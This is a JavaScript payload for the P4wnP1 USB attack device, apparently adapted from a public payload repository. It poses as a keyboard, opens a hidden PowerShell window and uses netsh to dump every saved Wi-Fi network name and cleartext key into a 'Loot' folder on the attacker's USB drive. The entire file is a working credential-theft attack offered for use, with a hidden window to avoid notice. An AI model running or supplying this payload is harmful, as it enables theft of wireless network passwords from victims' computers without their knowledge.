/*###########################################################################
# Wifi_keys_exfiltrator.js                                                  #
# Author: PingDucKY https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A    #
# Edited by: Coderdude112 on GitHub                                         #
# This script exfiltrates the Wifi keys for all known networks on a device  #
# PREREQUISTES:                                                             #
# Enable the keyboard and USB storage on your P4wnP1                        #
# Set the name of the P4wnP1 USB storage device to the variable usb_drive   #
###########################################################################*/

// Set the keyboard layout and speed
layout('us');   // Set keyboard layout to US
typingSpeed(0,0);   // Sets the typing speed to super super fast

// Define all variables, arrays, ect
var delay_time = 5          // The time to wait before executing the attack in seconds
var ready = "False"         // Used to make sure that the attack is ready to be executed
var usb_drive = "SNEAKY"    // The name of the P4wnP1's USB storage device

function attack() {
    press("GUI r");
    delay(500);
    type("powershell\n");   // Open a powershell menu
    delay(1000);

    type("powershell -windowstyle hidden {");   // Makes the powershell window hidden for the duration of the attack

    type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '" + usb_drive + "' } | select name;");  // Find the USB drive with the same name as the P4wnP1's name and save it as $usbPath
    type("$lootPath = $usbPath.name + \"Loot\\Wifi-keys\";mkdir $lootPath;");   // Make the full loot path variable and then create it

    type("netsh wlan show profiles * > $lootPath\\Known_networks_info.txt;");   // Get all the known netwoks and info about them and save it
    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPath\\Wifi_keys.txt;")  // Get the known networks keys and save them

    type("exit;}\n");   // Exit the powershell window and add the closing bracket to make the powershell window hidden
}
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");    // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10) // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {    // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True"; // Stop the while loop
            break;
        }
    }
}

delay(delay_time * 100);
check_if_ready();
attack();
